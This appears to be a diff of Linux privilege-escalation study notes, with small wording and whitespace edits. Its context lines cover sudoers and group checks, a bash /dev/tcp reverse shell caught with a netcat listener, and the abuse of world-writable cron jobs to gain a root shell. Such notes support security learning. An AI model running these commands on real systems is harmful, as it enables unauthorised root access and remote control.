@@ -7,7 +7,7 @@
   <img src="../imgs/sudoers.png" alt="sudoersImg" />
   
   If a user is specified under the root line, it means that he's personally allowed to run the **sudo command**. If he's not specified there, he could run the sudo command anyway, belonging to the **sudo group** 
-  
+
     - In this first VM, the user _diego_ belongs to _diego_ and _users_ groups, so he shouldn't be able to run the sudo command. But he's specified in sudoers file, so he can do it.<br>
     <img src="../imgs/groups.png" alt="groupsImg" width="30%">
 
@@ -50,7 +50,7 @@ Some versions of Linux will still allow password hashes to be stored there. We c
   bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
   ```
   - Then `nc -lvnp <PORT>` on your own Terminal to start a NetCat reverse shell.<br><br>
-  - If one of these **cron jobs are world-writable and searched in `/home/user` path** and **you're not root**, it's possible to modify and exploit them to gain a root shell in this way:
+  - If one of these **cron jobs are world-writable and searched in `/home/user` path** and **you're not root**, it's possible to modify and exploit them to get a root shell in this way:
   ```
   #!/bin/bash
   mkdir /tmpdir
